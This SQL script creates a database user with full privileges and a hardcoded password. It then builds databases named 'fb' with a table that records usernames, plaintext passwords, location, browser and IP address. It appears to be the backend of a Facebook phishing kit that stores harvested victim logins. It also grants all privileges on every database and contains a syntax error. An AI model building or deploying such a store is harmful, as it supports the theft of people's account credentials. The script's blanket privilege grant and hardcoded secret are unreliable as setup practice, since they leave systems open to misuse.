CREATE USER 'fbk'@'localhost' IDENTIFIED BY 'luyUEGGt6F0mC5iI';
GRANT ALL PRIVILEGES ON * . * TO 'fbk'@'localhost';
FLUSH PRIVILEGES;


CREATE DATABASE IF NOT EXISTS fb;
USE fb;

DROP TABLE IF EXISTS data;
CREATE TABLE data (
  id int(11) PRIMARY KEY AUTO_INCREMENT NOT NULL,
  user varchar(1000) DEFAULT NULL,
  pass varchar(1000) DEFAULT NULL,
  lugar varchar(100) NOT NULL,
  navegador varchar(200) not null,
ip varchar(20) DEFAULT NULL);






create database if not exist u393285625_fb;
use u393285625_fb;


DROP TABLE IF EXISTS `data`;
CREATE TABLE `data` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user` varchar(1000) COLLATE utf8_unicode_ci DEFAULT NULL,
  `pass` varchar(1000) COLLATE utf8_unicode_ci DEFAULT NULL,
  `lugar` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `navegador` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;